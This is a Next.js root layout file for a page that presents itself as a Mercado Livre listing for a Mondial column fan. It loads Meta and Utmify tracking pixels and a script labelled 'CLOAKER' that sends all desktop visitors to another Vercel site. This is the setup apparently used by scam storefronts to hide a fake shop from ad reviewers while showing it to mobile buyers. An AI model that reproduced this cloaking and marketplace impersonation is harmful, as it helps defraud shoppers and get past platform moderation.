import type React from "react"
import type { Metadata, Viewport } from "next"
import { Geist, Geist_Mono } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import Script from "next/script"
import "./globals.css"

const _geist = Geist({ subsets: ["latin"] })
const _geistMono = Geist_Mono({ subsets: ["latin"] })

export const metadata: Metadata = {
  title: "Ventilador de Coluna 40cm Turbo Mondial 140W 127V - NVT-40C-8P-B | Mercado Livre",
  description:
    "Ventilador de coluna Mondial com hélice turbo de 8 pás e 40cm de diâmetro. 3 velocidades, oscilação horizontal, coluna ajustável e sistema silencioso. Frete grátis!",
  generator: "v0.app",
  icons: {
    icon: [
      { url: "/icon-light-32x32.png", media: "(prefers-color-scheme: light)" },
      { url: "/icon-dark-32x32.png", media: "(prefers-color-scheme: dark)" },
      { url: "/icon.svg", type: "image/svg+xml" },
    ],
    apple: "/apple-icon.png",
  },
}

export const viewport: Viewport = {
  width: "device-width",
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
  themeColor: "#FFE600",
}

export default function RootLayout({
  children,
}: {
  children: React.ReactNode
}) {
  return (
    <html lang="pt-BR">
      <head>

        {/* META PIXEL NOVO */}
        <Script id="meta-pixel" strategy="afterInteractive">
          {`
            !function(f,b,e,v,n,t,s)
            {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
            n.queue=[];t=b.createElement(e);t.async=!0;
            t.src=v;s=b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t,s)}(window, document,'script',
            'https://connect.facebook.net/en_US/fbevents.js');
            fbq('init', '25933488686341661');
            fbq('track', 'PageView');
          `}
        </Script>

        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=25933488686341661&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>

        {/* UTMIFY NOVO */}
        <Script id="utmify-pixel" strategy="afterInteractive">
          {`
            window.pixelId = "698fa7740983a6df1d691258";
            var a = document.createElement("script");
            a.setAttribute("async", "");
            a.setAttribute("defer", "");
            a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
            document.head.appendChild(a);
          `}
        </Script>

        {/* CLOAKER */}
        <Script id="cloaker" strategy="afterInteractive">
          {`
            var url_link_redirect_pc = "https://v0-paradise-cloaker-script.vercel.app/";

            function isMobile() {
              const regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
              return regex.test(navigator.userAgent);
            }

            if (!isMobile()) {
              window.location.href = url_link_redirect_pc;
            }
          `}
        </Script>

      </head>

      <body className="font-sans antialiased">
        <a
          href="#main-content"
          className="sr-only focus:not-sr-only focus:absolute focus:top-0 focus:left-0 focus:z-[100] focus:bg-[#3483FA] focus:text-white focus:p-4"
        >
          Pular para o conteúdo principal
        </a>

        {children}
        <Analytics />
      </body>
    </html>
  )
}
